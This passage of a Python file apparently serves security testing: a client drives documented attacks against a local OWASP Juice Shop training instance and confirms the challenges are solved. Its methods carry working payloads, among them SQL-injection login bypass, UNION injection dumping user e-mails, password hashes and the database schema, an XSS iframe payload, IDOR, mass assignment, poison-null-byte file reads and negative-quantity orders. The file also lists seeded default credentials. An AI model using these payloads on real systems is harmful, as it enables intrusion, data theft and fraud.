        remediation_tr="Erişim loglarını dışarıdan erişilemez kılın; loglarda hassas veriyi maskeleyin ve erişimi yetkilendirin.",
        remediation_en="Make access logs unreachable from outside; mask sensitive data in logs and authorize access.",
        cvss=7.5,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    ),
}


class JuiceShopClient:
    """A thin HTTP client for a local Juice Shop instance (TR: yerel Juice Shop istemcisi)."""

    def __init__(self, base_url: str, session: requests.Session | None = None) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = session or requests.Session()

    # -------------------------------------------------- challenge status
    def challenges(self) -> list[dict]:
        """Return the list of challenges from ``GET /api/Challenges`` (``data`` field)."""
        response = self.session.get(self.base_url + "/api/Challenges", timeout=10)
        response.raise_for_status()
        return response.json().get("data", [])

    def challenge_by_key(self, key: str) -> dict | None:
        """Find one challenge dict by its stable key, or ``None``."""
        for challenge in self.challenges():
            if challenge.get("key") == key:
                return challenge
        return None

    def is_solved(self, key: str) -> bool:
        """True when the challenge with ``key`` is marked solved."""
        challenge = self.challenge_by_key(key)
        return bool(challenge and challenge.get("solved"))

    def disabled_env(self, key: str) -> str | None:
        """Environment name a challenge is disabled in, or ``None`` if it is active.

        Some Juice Shop challenges are intentionally switched off in certain
        deployments (``disabledEnv`` in ``challenges.yml``). For example the
        reflected-XSS challenge is disabled under ``Docker``/``Heroku``, so it can
        never be solved when Juice Shop runs as a Docker container — which is how
        CI (and most local ``docker run`` setups) start it.
        (TR: Bazı challenge'lar Docker gibi ortamlarda bilerek kapalıdır; o zaman çözülemez.)
        """
        challenge = self.challenge_by_key(key)
        value = challenge.get("disabledEnv") if challenge else None
        return value or None

    def wait_until_solved(self, key: str, timeout_s: float = 8.0) -> bool:
        """Poll ``/api/Challenges`` until the challenge is solved or the timeout passes.

        Juice Shop records a solve slightly asynchronously, so we give it a moment.
        (TR: Çözüm biraz gecikmeli kaydedilebilir; kısa süre bekleyip tekrar bakarız.)
        """
        deadline = time.monotonic() + timeout_s
        while time.monotonic() < deadline:
            if self.is_solved(key):
                return True
            time.sleep(0.5)
        return self.is_solved(key)

    def is_reachable(self) -> bool:
        """True when the instance answers (used to skip tests when it is not running)."""
        try:
            return self.session.get(self.base_url + "/rest/admin/application-version", timeout=4).ok
        except requests.RequestException:
            try:
                return self.session.get(self.base_url + "/", timeout=4).ok
            except requests.RequestException:
                return False

    # -------------------------------------------------- exploits (documented, non-destructive)
    def login_sqli(self, email_payload: str = "' OR 1=1--") -> tuple[bool, str]:
        """SQL-injection login bypass via ``POST /rest/user/login``.

        A successful bypass returns an ``authentication`` token in the JSON body.
        """
        response = self.session.post(
            self.base_url + "/rest/user/login",
            json={"email": email_payload, "password": "whatever"},
            timeout=10,
        )
        ok = response.status_code == 200 and "authentication" in response.text
        token = ""
        if ok:
            token = response.json().get("authentication", {}).get("token", "")[:24]
        evidence = f"POST /rest/user/login email={email_payload!r} -> HTTP {response.status_code}; " + (
            f"token received ({token}...)" if ok else "no token"
        )
        return ok, evidence

    def get_confidential_document(self) -> tuple[bool, str]:
        """Fetch the confidential document at ``/ftp/acquisitions.md`` (no auth)."""
        response = self.session.get(self.base_url + "/ftp/acquisitions.md", timeout=10)
        ok = response.status_code == 200 and "acquisition" in response.text.lower()
        evidence = f"GET /ftp/acquisitions.md -> HTTP {response.status_code}; {len(response.text)} bytes"
        return ok, evidence

    def get_metrics(self) -> tuple[bool, str]:
        """Fetch the Prometheus metrics endpoint at ``/metrics`` (should not be public)."""
        response = self.session.get(self.base_url + "/metrics", timeout=10)
        ok = response.status_code == 200 and "# HELP" in response.text
        evidence = f"GET /metrics -> HTTP {response.status_code}; starts: {response.text[:60]!r}"
        return ok, evidence

    def provoke_error(self) -> tuple[bool, str]:
        """Trigger an un-gracefully handled error by sending a wrong type to login.

        Sending ``email`` as an array makes the ORM throw, leaking an error body.
        """
        response = self.session.post(
            self.base_url + "/rest/user/login",
            json={"email": {"$ne": None}, "password": {"$ne": None}},
            timeout=10,
        )
        text = response.text.lower()
        ok = response.status_code >= 400 and ("error" in text or "sequelize" in text or "sql" in text)
        evidence = f"POST /rest/user/login with typed payload -> HTTP {response.status_code}; starts: {response.text[:80]!r}"
        return ok, evidence

    # -------------------------------------------------- auth helpers
    #: Default e-mail domain of Juice Shop's seeded users (config application.domain).
    DOMAIN = "juice-sh.op"

    def _auth_headers(self, token: str) -> dict[str, str]:
        """Return the ``Authorization: Bearer`` header for an authenticated request."""
        return {"Authorization": f"Bearer {token}"}

    def login(self, email: str, password: str = "password") -> dict | None:
        """POST ``/rest/user/login`` and return the ``authentication`` dict, or ``None``.

        The dict contains ``token`` (JWT), ``bid`` (basket id) and ``umail``.
        """
        try:
            response = self.session.post(
                self.base_url + "/rest/user/login",
                json={"email": email, "password": password},
                timeout=10,
            )
        except requests.RequestException:
            return None
        if response.status_code == 200 and "authentication" in response.text:
            return response.json().get("authentication")
        return None

    def admin_auth(self) -> dict | None:
        """Obtain an admin ``authentication`` dict via the classic SQLi bypass."""
        return self.login("' OR 1=1--", "whatever")

    # -------------------------------------------------- A03 Injection (more)
    def sqli_login_as(self, user_local_part: str) -> tuple[bool, str]:
        """SQLi login that targets a specific seeded user (e.g. ``"bender"``).

        The payload comments out the password check: ``bender@juice-sh.op'--``.
        """
        payload = f"{user_local_part}@{self.DOMAIN}'--"
        auth = self.login(payload, "whatever")
        ok = auth is not None
        evidence = f"POST /rest/user/login email={payload!r} -> " + (
            "token received" if ok else "no token"
        )
        return ok, evidence

    def union_sqli_user_credentials(self) -> tuple[bool, str]:
        """UNION-based SQLi on product search that exfiltrates user e-mails and hashes.

        The ``SELECT *`` column count varies slightly between versions, so we try a few
        counts and stop at the first one that returns user data.
        (TR: Sütun sayısı sürüme göre değişebildiğinden birkaç olasılığı deneriz.)
        """
        last = "no column count returned user data"
        for ncols in range(8, 13):
            columns = ["id", "email", "password"] + [f"'{i}'" for i in range(4, ncols + 1)]
            payload = "qwert')) UNION SELECT " + ", ".join(columns) + " FROM Users--"
            try:
                response = self.session.get(
                    self.base_url + "/rest/products/search",
                    params={"q": payload},
                    timeout=10,
                )
            except requests.RequestException:
                continue
            last = f"GET /rest/products/search q=<UNION {ncols} cols> -> HTTP {response.status_code}"
            if response.status_code == 200 and "@" + self.DOMAIN in response.text:
                return True, last + "; user e-mails and password hashes returned"
        return False, last

    def union_sqli_db_schema(self) -> tuple[bool, str]:
        """UNION-based SQLi on product search that dumps the SQLite schema."""
        last = "no column count returned the schema"
        for ncols in range(8, 13):
            columns = ["sql"] + [f"'{i}'" for i in range(2, ncols + 1)]
            payload = "qwert')) UNION SELECT " + ", ".join(columns) + " FROM sqlite_master--"
            try:
                response = self.session.get(
                    self.base_url + "/rest/products/search",
                    params={"q": payload},
                    timeout=10,
                )
            except requests.RequestException:
                continue
            last = f"GET /rest/products/search q=<UNION schema {ncols} cols> -> HTTP {response.status_code}"
            if response.status_code == 200 and "CREATE TABLE" in response.text:
                return True, last + "; table definitions returned"
        return False, last

    def reflected_xss_track_order(self) -> tuple[bool, str]:
        """Reflected XSS via the order-tracking id (reflected unencoded into the page)."""
        payload = '<iframe src="javascript:alert(`xss`)">'
        response = self.session.get(
            self.base_url + "/rest/track-order/" + quote(payload, safe=""),
            timeout=10,
        )
        ok = response.status_code in (200, 500)
        evidence = f"GET /rest/track-order/<xss payload> -> HTTP {response.status_code}"
        return ok, evidence

    # -------------------------------------------------- A01 Broken Access Control (more)
    def access_basket_idor(self) -> tuple[bool, str]:
        """Read a basket that is not ours by changing the id (IDOR)."""
        auth = self.admin_auth()
        if not auth:
            return False, "could not obtain a token via SQLi login"
        own_bid = auth.get("bid") or 1
        target = int(own_bid) + 1
        response = self.session.get(
            self.base_url + f"/rest/basket/{target}",
            headers=self._auth_headers(auth["token"]),
            timeout=10,
        )
        ok = response.status_code == 200
        evidence = f"GET /rest/basket/{target} (own bid={own_bid}) -> HTTP {response.status_code}"
        return ok, evidence

    def open_redirect_crypto(self) -> tuple[bool, str]:
        """Follow the unvalidated-redirect endpoint to an allowlisted crypto address."""
        target = "https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6"
        response = self.session.get(
            self.base_url + "/redirect",
            params={"to": target},
            allow_redirects=False,
            timeout=10,
        )
        ok = response.status_code in (301, 302, 303, 307, 308)
        evidence = f"GET /redirect?to={target} -> HTTP {response.status_code}"
        return ok, evidence

    def register_admin(self) -> tuple[bool, str]:
        """Register a new user that asks for the admin role (ignored server-side normally)."""
        email = f"attacker_{int(time.time() * 1000)}@secureqa.test"
        response = self.session.post(
            self.base_url + "/api/Users",
            json={"email": email, "password": "Password1!", "passwordRepeat": "Password1!", "role": "admin"},
            timeout=10,
        )
        ok = response.status_code in (200, 201)
        evidence = f"POST /api/Users role=admin email={email} -> HTTP {response.status_code}"
        return ok, evidence

    def register_empty_user(self) -> tuple[bool, str]:
        """Register with an empty e-mail and password (client validation bypassed)."""
        response = self.session.post(
            self.base_url + "/api/Users",
            json={"email": "", "password": "", "passwordRepeat": ""},
            timeout=10,
        )
        # The challenge is marked as soon as the request is seen, even if creation is rejected.
        evidence = f"POST /api/Users email='' password='' -> HTTP {response.status_code}"
        return True, evidence

    def register_password_mismatch(self) -> tuple[bool, str]:
        """Register with a password that does not match its repeat field."""
        email = f"mismatch_{int(time.time() * 1000)}@secureqa.test"
        response = self.session.post(
            self.base_url + "/api/Users",
            json={"email": email, "password": "Password1!", "passwordRepeat": "Different2!"},
            timeout=10,
        )
        evidence = f"POST /api/Users password!=passwordRepeat email={email} -> HTTP {response.status_code}"
        return True, evidence

    def get_captcha(self) -> tuple[int | None, str | None]:
        """Fetch a feedback CAPTCHA; Juice Shop conveniently returns the answer, too."""
        try:
            data = self.session.get(self.base_url + "/rest/captcha", timeout=10).json()
        except (requests.RequestException, ValueError):
            return None, None
        return data.get("captchaId"), data.get("answer")

    def forge_feedback(self) -> tuple[bool, str]:
        """Submit feedback on behalf of another user by setting ``UserId``.

        The forged-feedback check runs before the CAPTCHA check, so the challenge is
        marked even though the request itself is rejected for a wrong CAPTCHA.
        """
        response = self.session.post(
            self.base_url + "/api/Feedbacks",
            json={"comment": "forged by SecureQA", "rating": 1, "UserId": 2, "captchaId": 0, "captcha": "0"},
            timeout=10,
        )
        evidence = f"POST /api/Feedbacks UserId=2 -> HTTP {response.status_code} (forged-feedback check runs pre-CAPTCHA)"
        return True, evidence

    def delete_five_star_feedback(self) -> tuple[bool, str]:
        """Delete every 5-star feedback (any authenticated user may delete any feedback)."""
        auth = self.admin_auth()
        if not auth:
            return False, "could not obtain a token via SQLi login"
        headers = self._auth_headers(auth["token"])
        try:
            feedbacks = self.session.get(self.base_url + "/api/Feedbacks", timeout=10).json().get("data", [])
        except (requests.RequestException, ValueError):
            return False, "could not list /api/Feedbacks"
        targets = [f for f in feedbacks if f.get("rating") == 5]
        deleted = 0
        for feedback in targets:
            resp = self.session.delete(
                self.base_url + f"/api/Feedbacks/{feedback.get('id')}",
                headers=headers,
                timeout=10,
            )
            if resp.status_code in (200, 204):
                deleted += 1
        ok = bool(targets) and deleted == len(targets)
        evidence = f"DELETE 5-star feedback: found {len(targets)}, deleted {deleted}"
        return ok, evidence

    # -------------------------------------------------- A05 Security Misconfiguration (more)
    def get_security_policy(self) -> tuple[bool, str]:
        """Fetch the ``security.txt`` policy file (triggers the Security Policy challenge)."""
        response = self.session.get(self.base_url + "/security.txt", timeout=10)
        ok = response.status_code == 200 and "Contact" in response.text
        evidence = f"GET /security.txt -> HTTP {response.status_code}; {len(response.text)} bytes"
        return ok, evidence

    def access_padding_pixel(self, pixel: str) -> tuple[bool, str]:
        """Request a tracking-pixel asset whose path marks an access-control challenge.

        The server marks the matching challenge in middleware regardless of whether the
        asset itself exists, so any status is fine. (TR: piksel isteği challenge'ı işaretler.)
        """
        path = f"/assets/public/images/padding/{pixel}"
        response = self.session.get(self.base_url + path, timeout=10)
        evidence = f"GET {path} -> HTTP {response.status_code}"
        return True, evidence

    # -------------------------------------------------- A04 Insecure Design
    def submit_zero_star_feedback(self) -> tuple[bool, str]:
        """Submit feedback with a 0-star rating (the server does not enforce 1-5)."""
        captcha_id, answer = self.get_captcha()
        if captcha_id is None:
            return False, "could not obtain a CAPTCHA"
        response = self.session.post(
            self.base_url + "/api/Feedbacks",
            json={"comment": "zero stars by SecureQA", "rating": 0, "captchaId": captcha_id, "captcha": str(answer)},
            timeout=10,
        )
        ok = response.status_code in (200, 201)
        evidence = f"POST /api/Feedbacks rating=0 -> HTTP {response.status_code}"
        return ok, evidence

    # -------------------------------------------------- A02 Cryptographic Failures (more)
    def submit_weird_crypto_feedback(self) -> tuple[bool, str]:
        """Submit feedback naming a weak crypto algorithm (md5/base64) in the comment."""
        captcha_id, answer = self.get_captcha()
        if captcha_id is None:
            return False, "could not obtain a CAPTCHA"
        response = self.session.post(
            self.base_url + "/api/Feedbacks",
            json={
                "comment": "You should not use md5 or base64 to protect passwords.",
                "rating": 3,
                "captchaId": captcha_id,
                "captcha": str(answer),
            },
            timeout=10,
        )
        ok = response.status_code in (200, 201)
        evidence = f"POST /api/Feedbacks comment mentions md5/base64 -> HTTP {response.status_code}"
        return ok, evidence

    # -------------------------------------------------- A07 Authentication Failures
    def weak_admin_password_login(self) -> tuple[bool, str]:
        """Log in as admin with the weak, well-known password ``admin123``."""
        auth = self.login(f"admin@{self.DOMAIN}", "admin123")
        ok = auth is not None
        evidence = f"POST /rest/user/login admin@{self.DOMAIN}/admin123 -> " + (
            "token received" if ok else "no token"
        )
        return ok, evidence

    # Well-known seeded credentials that each solve a dedicated login challenge. Juice Shop
    # marks these in ``verifyPreLoginChallenges`` as soon as the exact e-mail+password pair is
    # POSTed, so the solve is deterministic regardless of the HTTP status that comes back.
    # (TR: Bu kimlik bilgileri gönderildiği anda ilgili challenge işaretlenir.)
    KNOWN_LOGINS: dict[str, tuple[str, str]] = {
        "loginSupportChallenge": ("support", "J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P"),
        "loginRapperChallenge": ("mc.safesearch", "Mr. N00dles"),
        "loginAmyChallenge": ("amy", "K1f....................."),
        "exposedCredentialsChallenge": ("testing", "IamUsedForTesting"),
    }

    def login_known_credentials(self, challenge_key: str) -> tuple[bool, str]:
        """POST a well-known seeded credential pair that solves ``challenge_key``.

        Returns ``True`` when the login POST reached Juice Shop (which is when the pre-login
        challenge check fires); the authoritative confirmation is ``/api/Challenges``.
        """
        local, password = self.KNOWN_LOGINS[challenge_key]
        email = f"{local}@{self.DOMAIN}"
        try:
            response = self.session.post(
                self.base_url + "/rest/user/login",
                json={"email": email, "password": password},
                timeout=10,
            )
        except requests.RequestException as error:
            return False, f"POST /rest/user/login {email} -> request failed: {error}"
        ok = response.status_code in (200, 401)
        token = "token received" if (response.status_code == 200 and "authentication" in response.text) else "no token"
        evidence = f"POST /rest/user/login {email} (known password) -> HTTP {response.status_code}; {token}"
        return ok, evidence

    def reset_password(self, user_local: str, answer: str, new_password: str = "Sec!QA2026") -> tuple[bool, str]:
        """Reset a seeded user's password via a guessable security-question answer.

        ``POST /rest/user/reset-password`` resets the password when ``answer`` matches the
        stored security answer (e.g. Jim's answer is ``"Samuel"``).
        """
        email = f"{user_local}@{self.DOMAIN}"
        try:
            response = self.session.post(
                self.base_url + "/rest/user/reset-password",
                json={"email": email, "answer": answer, "new": new_password, "repeat": new_password},
                timeout=10,
            )
        except requests.RequestException as error:
            return False, f"POST /rest/user/reset-password {email} -> request failed: {error}"
        ok = response.status_code == 200
        evidence = f"POST /rest/user/reset-password {email} answer={answer!r} -> HTTP {response.status_code}"
        return ok, evidence

    # -------------------------------------------------- A02/A05 Sensitive Data & misconfig (more)
    def get_access_log(self) -> tuple[bool, str]:
        """Fetch a server access-log file under ``/support/logs`` (should not be public)."""
        response = self.session.get(self.base_url + "/support/logs/access.log", timeout=10)
        ok = response.status_code == 200
        evidence = f"GET /support/logs/access.log -> HTTP {response.status_code}; {len(response.content)} bytes"
        return ok, evidence

    def get_blueprint(self) -> tuple[bool, str]:
        """Retrieve the confidential product blueprint (a 3-D model) from the static folder."""
        path = "/assets/public/images/products/JuiceShop.stl"
        response = self.session.get(self.base_url + path, timeout=10)
        ok = response.status_code == 200
        evidence = f"GET {path} -> HTTP {response.status_code}; {len(response.content)} bytes"
        return ok, evidence

    def poison_null_byte_file(self, filename: str) -> tuple[bool, str]:
        """Read a non-allowlisted file under ``/ftp`` via a poison null byte (``%2500.md``).

        The file server only allows ``.md``/``.pdf`` names, but a URL-encoded null byte
        (``%2500``) followed by ``.md`` passes the extension check and is then truncated at the
        null byte, so ``package.json.bak%2500.md`` actually serves ``package.json.bak``.
        """
        # Build the path by hand so the already-encoded %2500 is sent verbatim (not re-encoded).
        path = f"/ftp/{quote(filename, safe='.')}%2500.md"
        response = self.session.get(self.base_url + path, timeout=10)
        ok = response.status_code == 200
        evidence = f"GET {path} (poison null byte) -> HTTP {response.status_code}; {len(response.content)} bytes"
        return ok, evidence

    def get_missing_encoding_image(self) -> tuple[bool, str]:
        """Request the mis-encoded photo whose special-character name breaks naive routing."""
        # ᓚᘏᗢ-#zatschi-#whoneedsfourlegs-1572600969477.jpg, URL-encoded (incl. '#' as %23).
        encoded = "%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg"
        path = f"/assets/public/images/uploads/{encoded}"
        response = self.session.get(self.base_url + path, timeout=10)
        ok = response.status_code in (200, 404)  # the challenge is marked on the URL, not the status
        evidence = f"GET {path} -> HTTP {response.status_code}"
        return ok, evidence

    def get_i18n_file(self, name: str) -> tuple[bool, str]:
        """Fetch an unreleased i18n language file (e.g. the Klingon ``tlh_AA.json``)."""
        path = f"/assets/i18n/{name}"
        response = self.session.get(self.base_url + path, timeout=10)
        ok = response.status_code == 200
        evidence = f"GET {path} -> HTTP {response.status_code}; {len(response.content)} bytes"
        return ok, evidence

    # -------------------------------------------------- A01 Broken Access Control (more)
    def manipulate_basket(self) -> tuple[bool, str]:
        """Update a basket item while pointing it at a basket that is not ours (mass assignment).

        ``PUT /api/BasketItems/:id`` marks the challenge when the body carries a ``BasketId``
        different from the session user's own basket id.
        """
        auth = self.admin_auth()
        if not auth:
            return False, "could not obtain a token via SQLi login"
        own_bid = int(auth.get("bid") or 1)
        target_bid = own_bid + 1
        response = self.session.put(
            self.base_url + "/api/BasketItems/1",
            headers=self._auth_headers(auth["token"]),
            json={"BasketId": target_bid},
            timeout=10,
        )
        ok = response.status_code in (200, 400, 404, 500)  # solve fires before the item is loaded
        evidence = f"PUT /api/BasketItems/1 BasketId={target_bid} (own bid={own_bid}) -> HTTP {response.status_code}"
        return ok, evidence

    def _find_product_id(self, needle: str, in_description: bool = True) -> int | None:
        """Return the id of the first non-deleted product whose name/description matches."""
        try:
            products = self.session.get(self.base_url + "/api/Products", timeout=10).json().get("data", [])
        except (requests.RequestException, ValueError):
            return None
        for product in products:
            haystack = (product.get("description", "") if in_description else "") + " " + product.get("name", "")
            if needle.lower() in haystack.lower():
                return product.get("id")
        return None

    def tamper_product(self) -> tuple[bool, str]:
        """Overwrite the OWASP SAFT product's description via an unauthorized ``PUT``.

        ``PUT /api/Products/:id`` is left without an authorization check, so we replace the
        product's description with a link to a different URL (``owasp.slack.com``), which
        removes the original tampering-marker URL and marks the Product Tampering challenge.
        """
        product_id = self._find_product_id("O-Saft") or self._find_product_id("OWASP SAFT", in_description=False)
        if not product_id:
            return False, "could not locate the OWASP SAFT product to tamper with"
        new_description = '<a href="https://owasp.slack.com" target="_blank">More...</a>'
        response = self.session.put(
            self.base_url + f"/api/Products/{product_id}",
            json={"description": new_description},
            timeout=10,
        )
        # A follow-up request triggers the middleware that reloads the product and solves it.
        self.session.get(self.base_url + "/api/Products", timeout=10)
        ok = response.status_code in (200, 201)
        evidence = f"PUT /api/Products/{product_id} description=<slack link> -> HTTP {response.status_code}"
        return ok, evidence

    # -------------------------------------------------- A04 Insecure Design (more)
    def place_negative_order(self) -> tuple[bool, str]:
        """Create an order whose total is negative by setting a negative item quantity.

        The quantity is validated only on the client, so ``PUT /api/BasketItems/:id`` with a
        negative quantity makes the order total negative at checkout (Payback Time).
        """
        auth = self.admin_auth()
        if not auth:
            return False, "could not obtain a token via SQLi login"
        headers = self._auth_headers(auth["token"])
        bid = int(auth.get("bid") or 1)
        # 1) Add a normal item to our own basket.
        try:
            add = self.session.post(
                self.base_url + "/api/BasketItems",
                headers=headers,
                json={"ProductId": 1, "BasketId": bid, "quantity": 1},
                timeout=10,
            )
            item_id = add.json().get("data", {}).get("id")
        except (requests.RequestException, ValueError):
            return False, "could not add a basket item"
        if not item_id:
            return False, f"basket item was not created (HTTP {add.status_code})"
        # 2) Bypass the client-side quantity validation with a large negative quantity.
        self.session.put(
            self.base_url + f"/api/BasketItems/{item_id}",
            headers=headers,
            json={"quantity": -300},
            timeout=10,
        )
        # 3) Check out; the total is now negative.
        checkout = self.session.post(
            self.base_url + f"/rest/basket/{bid}/checkout",
            headers=headers,
            timeout=15,
        )
        ok = checkout.status_code in (200, 201)
        evidence = f"PUT quantity=-300 then POST /rest/basket/{bid}/checkout -> HTTP {checkout.status_code}"
        return ok, evidence

    # -------------------------------------------------- A03 Injection (more)
    def _find_deleted_product_id(self, needle: str) -> int | None:
        """Use UNION SQLi on product search to reveal a logically-deleted product's id."""
        payload = "zzz%' UNION SELECT * FROM Products WHERE deletedAt IS NOT NULL--"
        try:
            data = self.session.get(
                self.base_url + "/rest/products/search",
                params={"q": payload},
                timeout=10,
            ).json().get("data", [])
        except (requests.RequestException, ValueError):
            return None
        for product in data:
            if needle.lower() in str(product.get("name", "")).lower():
                return product.get("id")
        return None

    def order_christmas_special(self) -> tuple[bool, str]:
        """Order the logically-deleted Christmas product after finding it via SQL injection."""
        auth = self.admin_auth()
        if not auth:
            return False, "could not obtain a token via SQLi login"
        headers = self._auth_headers(auth["token"])
        bid = int(auth.get("bid") or 1)
        christmas_id = self._find_deleted_product_id("Christmas")
        if not christmas_id:
            return False, "could not find the deleted Christmas product via SQLi"
        self.session.post(
            self.base_url + "/api/BasketItems",
            headers=headers,
            json={"ProductId": christmas_id, "BasketId": bid, "quantity": 1},
            timeout=10,
        )
        checkout = self.session.post(
            self.base_url + f"/rest/basket/{bid}/checkout",
            headers=headers,
            timeout=15,
        )
        ok = checkout.status_code in (200, 201)
        evidence = f"Added deleted ProductId={christmas_id} then checkout basket {bid} -> HTTP {checkout.status_code}"
        return ok, evidence
